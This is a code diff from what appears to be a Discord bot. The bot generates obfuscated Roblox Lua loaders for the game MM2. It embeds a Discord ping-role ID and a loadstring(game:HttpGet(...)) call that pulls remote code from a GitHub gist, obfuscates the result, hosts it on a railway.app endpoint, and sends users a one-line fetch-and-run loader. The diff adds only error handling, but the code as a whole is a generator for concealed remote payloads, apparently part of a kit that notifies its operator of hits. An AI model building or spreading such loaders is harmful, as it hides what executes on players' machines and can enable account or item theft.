@@ -58,22 +58,31 @@ _G.PING_ROLE_ID = '${pingRole}'
 loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/8cac02e02ce7d86743822761c71e741b/raw/df692088f170df8d44230d5133779638a0080932/MM2ANTIWARE', true))()
 `;
 
-  // Defer the reply so we can edit it later
+  // Defer the reply with "thinking" status
   await submitted.deferReply();
 
   let obfuscated;
   try {
     obfuscated = await obfuscate(baseScript);
   } catch (err) {
-    return submitted.editReply(`❌ Failed: ${err.message}`);
+    return submitted.editReply(`❌ Failed to obfuscate: ${err.message}`);
   }
 
-  const id = await saveScript(obfuscated);
+  let id;
+  try {
+    id = await saveScript(obfuscated);
+  } catch (err) {
+    return submitted.editReply(`❌ Failed to save script: ${err.message}`);
+  }
+
   const loadstring = `loadstring(game:HttpGet("https://antiwares.up.railway.app/api/public/s/${id}"))()`;
 
   // Send to DMs
-  await interaction.user.send(`✅ **Loader generated!**\n\`\`\`lua\n${loadstring}\n\`\`\``);
-
-  // Confirm in channel
-  await submitted.editReply('✅ Loader generated and sent to your DMs!');
+  try {
+    await interaction.user.send(`✅ **Loader generated!**\n\`\`\`lua\n${loadstring}\n\`\`\``);
+    await submitted.editReply('✅ Loader generated and sent to your DMs!');
+  } catch (err) {
+    // If DMs are closed, send in channel
+    await submitted.editReply(`✅ **Loader generated!**\n\`\`\`lua\n${loadstring}\n\`\`\``);
+  }
 }
